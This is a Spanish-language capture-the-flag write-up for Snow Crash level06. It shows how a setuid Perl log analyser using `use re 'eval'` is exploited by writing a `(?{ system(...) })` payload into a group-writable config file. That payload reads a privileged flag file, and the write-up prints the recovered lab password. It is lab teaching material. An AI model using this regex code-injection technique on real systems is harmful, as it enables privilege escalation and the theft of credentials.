# Level06 - Snow Crash

## Tipo de ejercicio

Ejecución de código Perl mediante una expresión regular controlada por el
usuario, combinada con un binario `setuid` y una configuración escribible por
el grupo correspondiente.

## Objetivo

Encontrar la credencial que permite conectarse al usuario `level07`.

La vulnerabilidad aparece en Perl mediante `use re 'eval'` y un patrón regular
obtenido de `raven.conf`.

## 1. Identificar el componente del nivel

Desde la sesión SSH de `level06`:

```bash
whoami
hostname
pwd
ls -la
cat README
```

El README contiene la pista:

```text
Nothing passes through the Raven unread.
```

El componente del nivel se localiza en `/opt/snowcrash/level06`:

```bash
ls -la /opt/snowcrash/level06
ls -l /opt/snowcrash/level06/raven
file /opt/snowcrash/level06/raven
strings -a /opt/snowcrash/level06/raven
```

Resultado relevante:

```text
-r-sr-x--- 1 flag06 raven ... /opt/snowcrash/level06/raven
/opt/snowcrash/level06/raven: ELF 64-bit LSB pie executable
/usr/bin/perl
/opt/snowcrash/level06/raven.pl
```

El bit `setuid` hace que `raven` ejecute el script Perl con los privilegios de
`flag06`.

## 2. Analizar raven.pl

```bash
sed -n '1,360p' /opt/snowcrash/level06/raven.pl
```

Las partes importantes son:

```perl
use re 'eval';
my $CONFIG_FILE = '/etc/raven/raven.conf';
...
if ($line =~ /$pattern/) {
		$file_matched++;
}
```

El valor de `$pattern` procede de `loglevel_pattern` en la configuración y se
inserta directamente en una expresión regular. La directiva `use re 'eval'`
permite que un bloque `(?{ ... })` dentro del patrón ejecute código Perl.

## 3. Confirmar los permisos de la configuración

```bash
id
ls -ld /etc/raven
ls -l /etc/raven/raven.conf
cat /etc/raven/raven.conf
```

Resultado relevante:

```text
uid=1007(level06) ... groups=...,4006(raven)
drwxr-x--- 2 root raven ... /etc/raven
-rw-rw-r-- 1 root raven ... /etc/raven/raven.conf
```

`level06` pertenece al grupo `raven` y puede modificar el contenido del
archivo, aunque no puede crear archivos nuevos dentro del directorio. Por eso
se utiliza una redirección directa con `cat`, no `sed -i`, que necesitaría
crear un archivo temporal en `/etc/raven`.

## 4. Preparar el payload

El recurso textual utilizado está disponible en
[raven-payload.conf](raven-payload.conf). Su patrón ejecuta `cat` como
`flag06` y guarda el secreto en `/tmp`:

```text
loglevel_pattern = (?{ system('/bin/cat /home/flag06/.flag > /tmp/level06_flag.txt') })
```

Antes de modificar la configuración del servidor en ejecución, se guarda una
copia temporal:

```bash
cp /etc/raven/raven.conf /tmp/raven.conf.original
```

Después se instala temporalmente el contenido del recurso:

```bash
cat > /etc/raven/raven.conf <<'EOF'
log_dir = /var/log/snowcrash
max_size = 10485760
retention_days = 99999
loglevel_pattern = (?{ system('/bin/cat /home/flag06/.flag > /tmp/level06_flag.txt') })
EOF
```

El valor alto de `retention_days` es necesario porque los logs existentes son
antiguos y, con el valor predeterminado, Raven los descartaba antes de evaluar
el patrón.

## 5. Ejecutar Raven y obtener la credencial

```bash
/opt/snowcrash/level06/raven
cat /tmp/level06_flag.txt
```

La ejecución procesó los logs y mostró:

```text
Raven log analyser v2.4.1
	Total lines   : 6
	Matched       : 6
	Skipped files : 0
	Errors        : 0

wizelohxamaiuiia2uinaes4a
```

## 6. Restaurar la configuración

La imagen `.ova` no se modifica ni se crea una copia alterada. La escritura
realizada afecta temporalmente a un archivo escribible del servidor en
ejecución, que es el vector de explotación previsto por el nivel. Después de
leer la credencial se restaura el archivo original:

```bash
cp /tmp/raven.conf.original /etc/raven/raven.conf
```

## 7. Conectarse a level07

Desde el equipo anfitrión:

```bash
exit
ssh level07@localhost -p 2424
```

Cuando SSH solicite la contraseña, introducir:

```text
wizelohxamaiuiia2uinaes4a
```

## Conclusión

El binario `raven` es `setuid` y ejecuta un analizador Perl como `flag06`. El
usuario `level06`, miembro del grupo `raven`, puede escribir la configuración.
El patrón `loglevel_pattern` se evalúa dentro de una expresión regular Perl
gracias a `use re 'eval'`, permitiendo ejecutar `cat` y leer `.flag` con los
privilegios elevados.
